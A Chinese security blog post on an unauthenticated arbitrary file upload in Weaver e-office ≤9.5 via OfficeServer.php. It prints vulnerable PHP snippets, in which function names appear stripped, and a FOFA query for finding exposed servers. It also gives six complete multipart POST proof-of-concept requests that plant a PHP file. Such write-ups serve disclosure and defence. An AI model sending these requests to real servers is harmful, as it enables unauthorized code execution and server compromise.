---
title: "泛微e-office OfficeServer.php 文件上传漏洞"
source: https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer-rce.html
asset_dir: assets/泛微e-office-officeserver.php-文件上传漏洞
---

# 泛微e-office OfficeServer.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/14 08:25
- 1381浏览
- [0评论](#comment)
- 1小时阅读

深入探索

SQL

软件

鉴权

---

# 漏洞简介

[泛微](https://mrxn.net/tag/泛微)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `iWebOffice/OfficeServer.php` 接口 `SAVEFILE` 、`SAVEVERSION` 、`SAVEASHTML` 、`SAVEIMAGE` 、`PUTFILE` 和 `SAVETEMPLATE` 存在任意[文件上传](https://mrxn.net/tag/文件上传)漏洞，允许未经身份验证的攻击者上传恶意代码，植入后门，获取服务器权限，并控制整个 Web 服务器。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

深入探索

Windows安全工具

Web安全课程

SQL注入防护

## SAVEFILE

```
case "SAVEFILE" :
    $mRecordID = $RECORDID;
    $mUserName = $USERNAME;
    $mFileName = $FILENAME;
    $mFileType = $FILETYPE;
    $mDescript = $DESCRIPT;
    $mFileDate = $FileDate;
    $mFullPath = $mFilePath."/".$mFileName;
    if ( ( $_FILES['MsgFileBody']['tmp_name'] ) )
    {
        if ( ( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )
        {
            $mFileSize = $_FILES['MsgFileBody']['size'];
            $result = true;
        }
        else
        {
            $MsgObj->MsgError( "Save File Error" );
            $result = false;
        }
    }
```

因 `FILENAME` 和 `RECORDID` 参数用户可控，导致可以上传任意文件并执行远程代码。

漏洞预警服务

## SAVETEMPLATE

```
case "SAVETEMPLATE" :
    $mRecordID = $TEMPLATE;
    $mFileName = $FILENAME;
    $mFileType = $FILETYPE;
    $mFullPath = $mFilePath."/".$mRecordID.$mFileType;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    $MsgObj = $MsgObj."mFullPath=".( "mFullPath" )."\r\n";
    $mDescript = $DESCRIPT;
    $mFileDate = $FileDate;
    $mUserName = $UserName;
    if ( ( $_FILES['MsgFileBody']['tmp_name'] ) )
    {
        if ( ( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )
        {
            $mFileSize = $_FILES['MsgFileBody']['size'];
            $result = true;
        }
        else
        {
            $MsgError = "Save File Error";
            $result = false;
        }
    }
```

## SAVEVERSION

```
case "SAVEVERSION" :
    $mRecordID = $RECORDID;
    $mUserName = $USERNAME;
    $mFileName = $FILENAME;
    $mFileType = $FILETYPE;
    $mDescript = $DESCRIPT;
    $mFileDate = ( "Y-m-d H:i:s" );
    $mSql = "insert into Version_File (RecordID,FileType,FileDate,FilePath,UserName,Descript) values ('".$mRecordID."','".$mFileType."','".$mFileDate."','".$mFilePath."','".$mUserName."','".$mDescript."')";
    if ( ( $mSql ) )
    {
        $result = true;
    }
    else
    {
        $result = false;
    }
    $mSql = "SELECT Max(FileID) as FileID FROM Document_File WHERE RecordID='".$mRecordID."'";
    $rs = ( $mSql );
    if ( $row = ( $rs ) )
    {
        $mFileID = $row['FileID'];
    }
    $mFullPath = $mFilePath."/".$mRecordID.$mFileID.$mFileType;
    if ( ( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )
    {
        $mFileSize = $_FILES['MsgFileBody']['size'];
        $result = true;
    }
```

## SAVEASHTML

```
case "SAVEASHTML" :
    $mFileName = $HTMLNAME;
    $mDirectory = $DIRECTORY;
    $MsgObj->MsgTextClear;
    if ( ( $mDirectory ) == "" )
    {
        $mFullPath = $_SERVER['DOCUMENT_ROOT']."/iWebOffice/HTML/".$mFileName;
    }
    else
    {
        $mFullPath = $_SERVER['DOCUMENT_ROOT']."/iWebOffice/HTML/".$mDirectory."/".$mFileName;
        $MsgObj->MakeDirectory( $_SERVER['DOCUMENT_ROOT']."/iWebOffice/HTML/".$mDirectory );
    }
    if ( ( $_FILES['MsgFileBody']['tmp_name'] ) )
    {
        if ( ( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )
        {
            $mFileSize = $_FILES['MsgFileBody']['size'];
            $result = true;
        }
```

## SAVEIMAGE

```
case "SAVEIMAGE" :
    $mFileName = $HTMLNAME;
    $mDirectory = $DIRECTORY;
    $MsgObj->MsgTextClear;
    if ( ( $mDirectory ) == "" )
    {
        $mFullPath = $_SERVER['DOCUMENT_ROOT']."/iWebOffice/HTMLIMAGE/".$mFileName;
    }
    else
    {
        $mFullPath = $_SERVER['DOCUMENT_ROOT']."/iWebOffice/HTMLIMAGE/".$mDirectory."/".$mFileName;
        $MsgObj->MakeDirectory( $_SERVER['DOCUMENT_ROOT']."/iWebOffice/HTMLIMAGE/".$mDirectory );
    }
    if ( ( $_FILES['MsgFileBody']['tmp_name'] ) )
    {
        if ( ( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )
        {
            $mFileSize = $_FILES['MsgFileBody']['size'];
            $result = true;
        }
```

## PUTFILE

```
case "PUTFILE" :
    $mRecordID = $RECORDID;
    $mLocalFile = $LOCALFILE;
    $mRemoteFile = $REMOTEFILE;
    $mFilePath = $mFilePath."/".$mRemoteFile;
    $MsgObj->MsgTextClear( );
    if ( ( $_FILES['MsgFileBody']['tmp_name'] ) )
    {
        if ( ( $_FILES['MsgFileBody']['tmp_name'], $mFilePath ) )
        {
            $mFileSize = $_FILES['MsgFileBody']['size'];
            $result = true;
        }
```

# 漏洞复现

## SAVEFILE

```
POST /iWebOffice/OfficeServer.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="FILENAME"

test.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVEFILE
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `attachment/test.php`

[![泛微e-office OfficeServer.php 文件上传漏洞](images/img-001-f8b55194cabe.webp)](https://image.mrxn.net/0ecabf3710534f64a3f49fdda8785d07.webp)

## SAVETEMPLATE

```
POST /iWebOffice/OfficeServer.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="TEMPLATE"

test.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVETEMPLATE
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `attachment/test.php`

[![泛微e-office OfficeServer.php 文件上传漏洞](images/img-002-f8b55194cabe.webp)](https://image.mrxn.net/0ecabf3710534f64a3f49fdda8785d07.webp)

## SAVEVERSION

```
POST /iWebOffice/OfficeServer.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="RECORDID"

test
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVEVERSION
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="FILETYPE"

.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `/attachment/test.php`

[![泛微e-office OfficeServer.php 文件上传漏洞](images/img-003-adfebc49766c.webp)](https://image.mrxn.net/3aebddd1d0fc483782982cb14c7aa84b.webp)

## SAVEASHTML

```
POST /iWebOffice/OfficeServer.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="HTMLNAME"

test.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVEASHTML
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `/iWebOffice/HTML/test.php`

[![泛微e-office OfficeServer.php 文件上传漏洞](images/img-004-b31ae042e4aa.webp)](https://image.mrxn.net/0fefa67c89f74d7685536a857b8e9a2b.webp)

## SAVEIMAGE

```
POST /iWebOffice/OfficeServer.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="HTMLNAME"

test.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVEIMAGE
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `/iWebOffice/HTMLIMAGE/test.php`

[![泛微e-office OfficeServer.php 文件上传漏洞](images/img-005-28f1983b9288.webp)](https://image.mrxn.net/2aacbb708add49ab89b4ccaaea2e342c.webp)

## PUTFILE

```
POST /iWebOffice/OfficeServer.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="REMOTEFILE"

test.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

PUTFILE
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `/attachment/test.php`

[![泛微e-office OfficeServer.php 文件上传漏洞](images/img-006-a1a894ac60ce.webp)](https://image.mrxn.net/313939f77db54946bd72fda1e872c449.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.SAVEFILE](#toc-4-1-)
- [4.2.SAVETEMPLATE](#toc-4-2-)
- [4.3.SAVEVERSION](#toc-4-3-)
- [4.4.SAVEASHTML](#toc-4-4-)
- [4.5.SAVEIMAGE](#toc-4-5-)
- [4.6.PUTFILE](#toc-4-6-)
- [5.漏洞复现](#toc-5-)
- [5.1.SAVEFILE](#toc-5-1-)
- [5.2.SAVETEMPLATE](#toc-5-2-)
- [5.3.SAVEVERSION](#toc-5-3-)
- [5.4.SAVEASHTML](#toc-5-4-)
- [5.5.SAVEIMAGE](#toc-5-5-)
- [5.6.PUTFILE](#toc-5-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
